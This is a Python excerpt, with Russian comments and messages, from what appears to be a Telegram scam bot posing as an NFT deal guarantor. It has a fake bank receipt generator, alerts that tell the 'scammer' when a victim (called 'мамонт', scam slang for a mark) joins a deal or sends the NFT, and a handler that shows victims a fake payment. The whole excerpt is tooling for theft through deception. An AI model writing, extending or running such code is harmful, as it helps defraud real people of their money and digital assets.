...
def generate_fake_bank_receipt(deal):
    """Генерация фейкового банковского чека (функция оставлена для совместимости, но не используется)"""
...
class NFTBot:
    ...
    def handle_mammoth_start(self, chat_id, user_id, deal_id):
        ...
        # ---- НАЧАЛО ДОБАВЛЕНИЯ: УВЕДОМЛЕНИЕ ГАРАНТУ ----
        try:
            scammer_id = deal['scammer_id']
            if scammer_id:
                notification_text = (
                    f"🔔 <b>МАМОНТ ВОШЕЛ В СДЕЛКУ</b>\n\n"
                    f"📋 <b>ID сделки:</b> <code>{deal['id']}</code>\n"
                    f"💰 <b>Сумма:</b> {format_price(deal['price'])}\n"
                    f"👤 <b>ID мамонта:</b> <code>{user_id}</code>\n"
                    f"⏰ <b>Время:</b> {datetime.now().strftime('%H:%M:%S')}\n\n"
                    f"🔄 <b>Статус сделки:</b> ожидание подтверждений."
                )
                send_message(scammer_id, notification_text)
                print(f"✅ Уведомление отправлено гаранту {scammer_id} о входе мамонта {user_id}")
        except Exception as e:
            print(f"⚠️ Не удалось отправить уведомление гаранту: {e}")
            traceback.print_exc()
        # ---- КОНЕЦ ДОБАВЛЕНИЯ ----
    ...
    def handle_mammoth_confirm(self, query_id, deal_id, user_id):
        ...
        if result == 'completed':
            ...
            scammer_msg = (
                f"🎉 <b>СДЕЛКА #{deal_id} ЗАВЕРШЕНА!</b>\n\n"
                f"✅ Получатель подтвердил отправку NFT\n"
                f"✅ Вы подтвердил отправку денег\n\n"
                f"💰 Сумма: {format_price(deal['price'])}\n"
                f"🎨 NFT получено: {deal['gift_link']}\n\n"
    ...
    def handle_fake_payment(self, query_id, deal_id, user_id):
        ...
        # Отправляем мамонту общее уведомление (без детального банковского чека)
